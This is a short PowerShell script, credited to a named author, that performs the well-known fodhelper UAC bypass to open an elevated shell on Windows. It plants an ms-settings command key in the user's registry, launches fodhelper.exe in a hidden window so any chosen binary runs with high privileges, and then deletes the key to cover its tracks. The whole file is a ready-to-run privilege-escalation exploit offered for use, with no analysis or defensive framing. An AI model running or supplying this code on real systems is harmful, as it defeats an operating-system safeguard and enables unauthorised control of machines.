#################################################################
#                    AUTHOR: NADIM SALIBY                       #
#                EMAIL: nadimjsaliby@gmail.com                  #
#SUBJECT: Automated script to get an admin shell using fodhelper#
#################################################################

function FodhelperBypass(){ 
 
Param (    
 
 [String]$program = "cmd /c start powershell.exe" #default, can be changed to execute any binary file with high privileges
 
      )
 
#Create registry structure
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}
